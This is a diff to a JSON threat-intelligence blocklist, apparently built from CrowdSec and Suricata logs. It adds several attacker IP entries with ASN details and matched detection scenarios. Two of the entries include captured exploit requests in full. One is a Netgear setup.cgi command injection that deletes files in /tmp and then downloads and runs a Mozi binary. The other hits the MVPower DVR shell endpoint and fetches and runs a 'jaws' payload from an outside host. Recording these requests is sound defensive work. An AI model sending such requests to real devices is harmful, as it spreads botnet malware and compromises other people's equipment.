@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-10-29T01:00:00Z",
+  "generated_at": "2026-10-29T13:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 1373,
-    "v4": 1373,
+    "total": 1377,
+    "v4": 1377,
     "v6": 0
   },
   "items": [
@@ -22427,6 +22427,82 @@
       "asn_prefix": "72.255.18.0/24",
       "payloads": [
         "POST /GponForm/diag_Form?images/"
+      ]
+    },
+    {
+      "ip": "202.47.53.117",
+      "family": "v4",
+      "first_seen": "2026-10-29T04:00:00Z",
+      "last_seen": "2026-10-29T04:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "asn": "9541",
+      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
+      "asn_prefix": "202.47.53.0/24",
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://202.47.53.117:45757/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://202.47.53.117:45757/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "197.50.11.7",
+      "family": "v4",
+      "first_seen": "2026-10-29T05:00:00Z",
+      "last_seen": "2026-10-29T05:00:00Z",
+      "scenarios": [
+        "suricata/ET EXPLOIT MVPower DVR Shell UCE"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8452",
+      "asn_name": "TE-AS - IDDQD-AS",
+      "asn_prefix": "197.50.0.0/18",
+      "payloads": [
+        "GET /shell?cd+/tmp;rm+-rf+*;wget+129.212.239.241/jaws;sh+/tmp/jaws"
+      ]
+    },
+    {
+      "ip": "152.32.236.102",
+      "family": "v4",
+      "first_seen": "2026-10-29T03:00:00Z",
+      "last_seen": "2026-10-29T03:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 5"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "135377",
+      "asn_name": "UCLOUD-HK-AS-AP - UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+      "asn_prefix": "152.32.236.0/24"
+    },
+    {
+      "ip": "85.217.140.5",
+      "family": "v4",
+      "first_seen": "2026-10-29T05:00:00Z",
+      "last_seen": "2026-10-29T05:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Suspicious User-Agent Containing Web Scan/er Likely Web Scanner"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "209334",
+      "asn_name": "MODAT-01 Modat B.V.",
+      "asn_prefix": "85.217.140.0/24",
+      "tags": [
+        "mwl:scanner=\"modat\""
+      ],
+      "payloads": [
+        "GET /"
       ]
     }
   ]
